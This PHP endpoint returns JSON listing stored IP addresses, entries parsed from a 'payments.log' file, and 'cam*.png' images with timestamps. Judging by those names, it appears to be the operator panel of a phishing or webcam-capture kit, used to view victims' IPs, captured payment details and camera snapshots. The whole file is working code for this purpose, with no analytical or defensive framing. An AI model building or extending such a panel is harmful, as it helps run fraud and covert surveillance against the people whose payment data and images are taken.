<?php
header('Content-Type: application/json');
$response = ['ips' => [], 'payments' => [], 'cameras' => [], 'last_update' => date('Y-m-d H:i:s')];

if (file_exists('saved.ips.txt')) {
    foreach (file('saved.ips.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) as $ip) {
        $response['ips'][] = ['ip' => trim($ip), 'time' => date('H:i:s'), 'timestamp' => time()];
    }
}

if (file_exists('payments.log')) {
    $entries = explode("==========================\n", file_get_contents('payments.log'));
    foreach ($entries as $entry) {
        if (trim($entry) === '') continue;
        $payment = [];
        foreach (explode("\n", trim($entry)) as $line) {
            if (strpos($line, ':') !== false && strpos($line, '===') === false) {
                list($k, $v) = explode(':', $line, 2);
                $payment[trim($k)] = trim($v);
            }
        }
        if (!empty($payment)) { $payment['timestamp'] = time(); $response['payments'][] = $payment; }
    }
}

foreach (glob('cam*.png') as $file) {
    $response['cameras'][] = ['filename' => basename($file), 'url' => $file, 'time' => date('H:i:s', filemtime($file)), 'timestamp' => filemtime($file)];
}

echo json_encode($response);
?>